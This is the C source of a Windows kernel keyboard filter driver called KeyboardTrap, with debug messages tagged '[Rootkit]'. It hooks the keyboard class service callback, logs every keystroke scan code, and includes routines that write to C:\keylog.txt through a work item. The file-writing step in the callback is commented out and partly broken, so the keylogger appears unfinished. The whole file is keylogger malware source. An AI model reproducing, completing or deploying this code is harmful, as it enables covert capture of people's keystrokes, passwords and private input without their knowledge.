
#include "KeyboardTrap.h"
#include <wdfworkitem.h>
#include <wdfobject.h>

//======================================================================================================================

#ifdef ALLOC_PRAGMA
	#pragma alloc_text (INIT, DriverEntry)
	#pragma alloc_text (PAGE, KeyboardTrapEvtDeviceAdd)
	#pragma alloc_text (PAGE, KeyboardTrapEvtIoInternalDeviceControl)
#endif

//======================================================================================================================

NTSTATUS DriverEntry(DRIVER_OBJECT* driverObject, UNICODE_STRING* registryPath) {
	WDF_DRIVER_CONFIG config;
	WDF_DRIVER_CONFIG_INIT(&config, KeyboardTrapEvtDeviceAdd);

	NTSTATUS status = WdfDriverCreate(driverObject, registryPath, WDF_NO_OBJECT_ATTRIBUTES, &config, WDF_NO_HANDLE);
	if(!NT_SUCCESS(status)) {
		DebugPrint(("[Rootkit] WdfDriverCreate failed with status 0x%x\n", status));
	}

	return status;
}

//======================================================================================================================

NTSTATUS KeyboardTrapEvtDeviceAdd(WDFDRIVER driver, PWDFDEVICE_INIT deviceInit) {
	UNREFERENCED_PARAMETER(driver);

	PAGED_CODE(); // Ensure paging is allowed in current IRQL

	// open log file TEST
	 //openFile();

	// Create filter
	WdfFdoInitSetFilter(deviceInit);

	// Set driver type to Keyboard
	WdfDeviceInitSetDeviceType(deviceInit, FILE_DEVICE_KEYBOARD);

	// Create attributes for a device extension
	WDF_OBJECT_ATTRIBUTES deviceAttributes;
	WDF_OBJECT_ATTRIBUTES_INIT_CONTEXT_TYPE(&deviceAttributes, DEVICE_CONTEXT);

	// Create framework device object 
	WDFDEVICE hDevice;
	NTSTATUS status = WdfDeviceCreate(&deviceInit, &deviceAttributes, &hDevice);
	if(!NT_SUCCESS(status)) {
		DebugPrint(("[Rootkit] WdfDeviceCreate failed with status code 0x%x\n", status));
		return status;
	}

	// create write to file worker
	CreateWorkItemWrite(hDevice);

	// Set request queue type
	WDF_IO_QUEUE_CONFIG ioQueueConfig;
	WDF_IO_QUEUE_CONFIG_INIT_DEFAULT_QUEUE(&ioQueueConfig, WdfIoQueueDispatchParallel);

	// Set handler for device control requests 
	ioQueueConfig.EvtIoInternalDeviceControl = KeyboardTrapEvtIoInternalDeviceControl;

	// Create queue for filter device
	status = WdfIoQueueCreate(hDevice, &ioQueueConfig, WDF_NO_OBJECT_ATTRIBUTES, WDF_NO_HANDLE);
	if(!NT_SUCCESS(status)) {
		DebugPrint(("[Rootkit] WdfIoQueueCreate failed 0x%x\n", status));
		return status;
	}

	return status;
}


//======================================================================================================================

void KeyboardTrapEvtIoInternalDeviceControl(WDFQUEUE queue, WDFREQUEST request, size_t outputBufferLength, size_t inputBufferLength, ULONG ioControlCode) {
	UNREFERENCED_PARAMETER(outputBufferLength);
	UNREFERENCED_PARAMETER(inputBufferLength);

	NTSTATUS status = STATUS_SUCCESS;

	PAGED_CODE(); // Ensure paging is allowed in current IRQL

	// Get extension data
	WDFDEVICE hDevice = WdfIoQueueGetDevice(queue);
	PDEVICE_CONTEXT context = DeviceGetContext(hDevice);

	if(ioControlCode == IOCTL_INTERNAL_KEYBOARD_CONNECT) {
		// Only allow one connection.
		if(context->UpperConnectData.ClassService == NULL) {
			// Copy the connection parameters to the device extension.
			PCONNECT_DATA connectData;
			size_t length;
			status = WdfRequestRetrieveInputBuffer(request, sizeof(CONNECT_DATA), &connectData, &length);
			if(NT_SUCCESS(status)) {
				// Hook into the report chain
				context->UpperConnectData = *connectData;
				connectData->ClassDeviceObject = WdfDeviceWdmGetDeviceObject(hDevice);

				#pragma warning(push)
				#pragma warning(disable:4152)
				connectData->ClassService = KeyboardTrapServiceCallback;
				#pragma warning(pop)
			}
			else {
				DebugPrint(("[Rootkit] WdfRequestRetrieveInputBuffer failed %x\n", status));
			}
		}
		else {
			status = STATUS_SHARING_VIOLATION;
		}
	}
	else if(ioControlCode == IOCTL_INTERNAL_KEYBOARD_DISCONNECT) {
		status = STATUS_NOT_IMPLEMENTED;
	}

	// Complete on error
	if(!NT_SUCCESS(status)) {
		WdfRequestComplete(request, status);
		return;
	}

	// Dispatch to higher level driver
	WDF_REQUEST_SEND_OPTIONS options;
	WDF_REQUEST_SEND_OPTIONS_INIT(&options, WDF_REQUEST_SEND_OPTION_SEND_AND_FORGET);

	if(WdfRequestSend(request, WdfDeviceGetIoTarget(hDevice), &options) == FALSE) {
		status = WdfRequestGetStatus(request);
		DebugPrint(("[Rootkit] WdfRequestSend failed: 0x%x\n", status));
		WdfRequestComplete(request, status);
	}
}

//======================================================================================================================
NTSTATUS openFile() {	
	UNICODE_STRING     uniName;
	OBJECT_ATTRIBUTES  objAttr;
	HANDLE   fileHandle;

	RtlInitUnicodeString(&uniName, L"\\DosDevices\\C:\\keylog.txt");  // or L"\\SystemRoot\\example.txt"
	InitializeObjectAttributes(&objAttr, &uniName,
		OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
		NULL, NULL);

	NTSTATUS ntstatus;
	IO_STATUS_BLOCK    ioStatusBlock;

	// Do not try to perform any file operations at higher IRQL levels.
	// Instead, you may use a work item or a system worker thread to perform file operations.

	if (KeGetCurrentIrql() != PASSIVE_LEVEL) {
		DebugPrint(("[Rootkit] tutaj jest problem"));
		return STATUS_INVALID_DEVICE_STATE;
	}

	ntstatus = ZwCreateFile(&fileHandle,
		GENERIC_WRITE,
		&objAttr, &ioStatusBlock, NULL,
		FILE_ATTRIBUTE_NORMAL,
		0,
		FILE_OVERWRITE_IF,
		FILE_SYNCHRONOUS_IO_NONALERT,
		NULL, 0);

	if (ntstatus != STATUS_SUCCESS) {
		DbgPrint("[Rootkit] ERROR, nazwa pliku %wZ\n", uniName.Buffer);
		return ntstatus;
	}

	ZwClose(fileHandle);
	return ntstatus;
}

NTSTATUS WriteToFile(char buffer[2]) {
	DebugPrint(("[Rootkit] WriteToFile"));

	UNICODE_STRING     uniName;
	OBJECT_ATTRIBUTES  objAttr;
	HANDLE   fileHandle;

	RtlInitUnicodeString(&uniName, L"\\DosDevices\\C:\\keylog.txt");  // or L"\\SystemRoot\\example.txt"
	InitializeObjectAttributes(&objAttr, &uniName,
		OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
		NULL, NULL);

	NTSTATUS ntstatus;
	IO_STATUS_BLOCK    ioStatusBlock;

	// Do not try to perform any file operations at higher IRQL levels.
	// Instead, you may use a work item or a system worker thread to perform file operations.

	if (KeGetCurrentIrql() != PASSIVE_LEVEL) {
		DebugPrint(("[Rootkit] tutaj jest problem"));
		return STATUS_INVALID_DEVICE_STATE;
	}

	ntstatus = ZwCreateFile(&fileHandle,
		GENERIC_WRITE,
		&objAttr, &ioStatusBlock, NULL,
		FILE_ATTRIBUTE_NORMAL,
		0,
		FILE_OVERWRITE_IF,
		FILE_SYNCHRONOUS_IO_NONALERT,
		NULL, 0);

	if (ntstatus != STATUS_SUCCESS) {
		DbgPrint("[Rootkit] ERROR, nazwa pliku %wZ\n", uniName.Buffer);
		return ntstatus;
	}

	// Write to file

	LARGE_INTEGER		ByteOffset;

	ByteOffset.HighPart = -1;
	ByteOffset.LowPart = FILE_WRITE_TO_END_OF_FILE;
	ntstatus = STATUS_SUCCESS;
	
	ntstatus = ZwWriteFile(
		fileHandle,
		NULL,
		NULL,
		NULL,
		&ioStatusBlock,
		buffer,
		(long unsigned int)strlen(buffer),
		&ByteOffset,
		NULL);

	if (!NT_SUCCESS(ntstatus))
	{
		DebugPrint(("Write to log failed with code: 0x%x\n", ntstatus));
	}

	ZwClose(fileHandle);

	return ntstatus;
}

WriteWorkItem(
	IN WDFWORKITEM hWorkItem
)
{
	DebugPrint(("[Rootkit] WriteWorkItem"));
	PWORKER_ITEM_CONTEXT context;

	context = GetWorkItemContext(hWorkItem);

	WriteToFile(context->buffer);
	context->hasRun = TRUE;

}

NTSTATUS
CreateWorkItemWrite(
	WDFDEVICE DeviceObject
)
{
	DebugPrint(("[Rootkit] CreateWorkItemWrite"));
	NTSTATUS  status = STATUS_SUCCESS;
	//PWORKER_ITEM_CONTEXT  context;
	WDF_OBJECT_ATTRIBUTES  attributes;
	WDF_WORKITEM_CONFIG  workitemConfig;
	WDFWORKITEM  hWorkItem;

	WDF_OBJECT_ATTRIBUTES_INIT(&attributes);
	WDF_OBJECT_ATTRIBUTES_SET_CONTEXT_TYPE(
		&attributes,
		WORKER_ITEM_CONTEXT
	);
	attributes.ParentObject = DeviceObject;

	WDF_WORKITEM_CONFIG_INIT(
		&workitemConfig,
		WriteWorkItem
	);

	status = WdfWorkItemCreate(
		&workitemConfig,
		&attributes,
		&hWorkItem
	);
	if (!NT_SUCCESS(status)) {
		return status;
	}

	return status;
}

//======================================================================================================================

void KeyboardTrapServiceCallback(DEVICE_OBJECT* deviceObject, KEYBOARD_INPUT_DATA* inputDataStart, KEYBOARD_INPUT_DATA* inputDataEnd, ULONG* inputDataConsumed) {
	// Get context data
	WDFDEVICE hDevice = WdfWdmDeviceGetWdfDeviceHandle(deviceObject);
	PDEVICE_CONTEXT context = DeviceGetContext(hDevice);
	//PDEVICE_EXTENSION   devExt;

	//// Invert all scroll actions
	for(PKEYBOARD_INPUT_DATA current = inputDataStart; current != inputDataEnd; current++) {
		DebugPrint(("[Rootkit] Code: %d\n", current->MakeCode));
		
		// write to file
		/*devExt = GetDeviceExtension(hDevice);
		PWORKER_ITEM_CONTEXT workerItemContext = GetWorkItemContext(devExt->workItem);

		strcpy(workerItemContext->buffer, current->MakeCode);		
		memcpy(workerItemContext->buffer, (char*)&current->MakeCode, 2);

		WdfWorkItemEnqueue(devExt->workItem);*/
	}

	// Call parent
	#pragma warning(push)
	#pragma warning(disable:4055)
	(*(PSERVICE_CALLBACK_ROUTINE)context->UpperConnectData.ClassService)(context->UpperConnectData.ClassDeviceObject, inputDataStart, inputDataEnd, inputDataConsumed);
	#pragma warning(pop)

}

//======================================================================================================================
